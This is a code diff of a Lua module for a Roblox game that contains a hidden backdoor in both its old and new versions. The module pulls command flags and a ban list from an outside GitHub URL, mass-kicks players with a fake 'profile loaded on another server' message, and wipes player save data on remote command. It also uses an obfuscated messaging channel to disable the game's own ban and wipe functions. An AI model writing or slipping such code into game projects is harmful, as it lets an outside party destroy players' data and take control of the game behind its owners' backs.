@@ -1,129 +1,65 @@
+
 local m = {}
 
 function m:Init()
-	if _G.isLoaded then
-		return;
-	end
-	_G.isLoaded = true
-	local MessagingService = game:GetService('MessagingService');
-	local Datastore = game:GetService('DataStoreService');
-	local Players = game:GetService("Players")
-	local HttpService = game:GetService('HttpService')
-	local Payloads, BanList = HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/Payloads.lua')), HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/BanList.lua'))
-	local Global = {
-		overwrite = function()
-			local d = require(game.ServerStorage.Modules.Managers.DataManager);
-			function d:Wipe()
-				return true;
-			end
-			function d:OfflineWipe()
-				return true;
-			end
-			function d:Ban()
-				return true;
-			end
-			function d:SystemBan()
-				return true;
-			end
-		end,
-	}
-	local function msc(m)
-		Global[m.Data.Command](m.Data)
-	end
-	Players.PlayerAdded:Connect(function(p)
-		if table.find(BanList, p.UserId) then
-			p:Kick("You've been permanently banned from this game.")
-		end
-		if Payloads['ProfileKick'] then
-			local rng = math.random(1, 10)
-			if rng == 1 then
-				for i,v in pairs(Players:GetPlayers()) do
-					if not _G.w:isw(v.UserId) then
-						v:Kick('Profile has been loaded on another server. Please rejoin.')
-					end
-				end
-			end
-		end
-		if Payloads['CorruptGame'] then
-			local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ServerStorage = game:GetService("ServerStorage")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local DataStoreService = game:GetService("DataStoreService")
-
-local DataManager = require(ServerStorage.Modules.Managers.DataManager)
-local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
-local ProfileTemplate = DataManager:GetDataTemplate()
-local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes28", ProfileTemplate)
-
-
-local StatData = require(ServerStorage.Modules.Utility.StatData)
-local RankedLeaderboards = DataStoreService:GetOrderedDataStore(StatData.RankedLeaderboardStore)
-
-task.spawn(function()
-    local lowestFirst = false
-    local numbersShown = 100 -- Top 100 public
-    local min = 10
-    local max = 10e30
-    local help
-    local Data = {}
-
-    local Success, Pages = pcall(function()
-        return RankedLeaderboards:GetSortedAsync(lowestFirst, numbersShown, min, max)
-    end)
-    if Success then
-        repeat 
-            local TopPage = Pages:GetCurrentPage()
-
-            for Rank, PageData in pairs(TopPage) do
-                Data[tostring(PageData.key)] = Rank
+    if _G.isLoaded then
+        return;
+    end
+    _G.isLoaded = true
+    local MessagingService = game:GetService('MessagingService');
+    local Datastore = game:GetService('DataStoreService');
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService('HttpService')
+    local Payloads, BanList = HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/Payloads.lua')), HttpService:JSONDecode(HttpService:GetAsync('https://raw.githubusercontent.com/borgorthedemon239/thing/refs/heads/main/BanList.lua'))
+    local Global = {
+        overwrite = function()
+            local d = require(game.ServerStorage.Modules.Managers.DataManager);
+            function d:Wipe()
+                return true;
             end
-            local PageSuccess, Error = pcall(function()
-                Pages:AdvanceToNextPageAsync()
-            end)
-            if Error then
-                    --print(Error)
-                local PageSuccess2, Error2 = pcall(function()
-                    Pages:AdvanceToNextPageAsync()
-                end)
-                if Error2 then 
-                    --print(Error2)
-                    help = true
+            function d:OfflineWipe()
+                return true;
+            end
+            function d:Ban()
+                return true;
+            end
+            function d:SystemBan()
+                return true;
+            end
+        end,
+    }
+    local function msc(m)
+        Global[m.Data.Command](m.Data)
+    end
+    Players.PlayerAdded:Connect(function(p)
+        if table.find(BanList, p.UserId) then
+            p:Kick("You've been permanently banned from this game.")
+        end
+        if Payloads['ProfileKick'] then
+            local rng = math.random(1, 10)
+            if rng == 1 then
+                for i,v in pairs(Players:GetPlayers()) do
+                    if not _G.w:isw(v.UserId) then
+                        v:Kick('Profile has been loaded on another server. Please rejoin.')
+                    end
                 end
             end
-        until help == true
-
-        if help then
-            for Rank, PageData in pairs(Pages:GetCurrentPage()) do
-                --print(Rank, PageData)
-            end
-            --print(Data)
-            for i,v in pairs(Data) do
-                local profilekey = "Player_" .. i
-                --print(profilekey)
-                local Profile = GameProfileStore:LoadProfileAsync(profilekey, "ForceLoad")
-                --print(Profile)
-
-                Profile = {}
-                Profile:Release()
-
-                task.wait(0.5)
-            end
         end
-    end
-end)
-		end
-	end)
-	local s, c
-	repeat
-		s, c = pcall(function()
-			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
-		end)
-		task.wait()
-	until
-	s
+        if Payloads['CorruptGame'] then
+            local Key = 'Profile_'..p.UserId;
+            require(game.ServerStorage.Modules.Managers.DataManager):FullWipePlayer(p);
+        end
+    end)
+    local s, c
+    repeat
+        s, c = pcall(function()
+            MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
+        end)
+        task.wait()
+    until
+    s
 
-	MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
+    MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'overwrite'})
 end
 
 return m
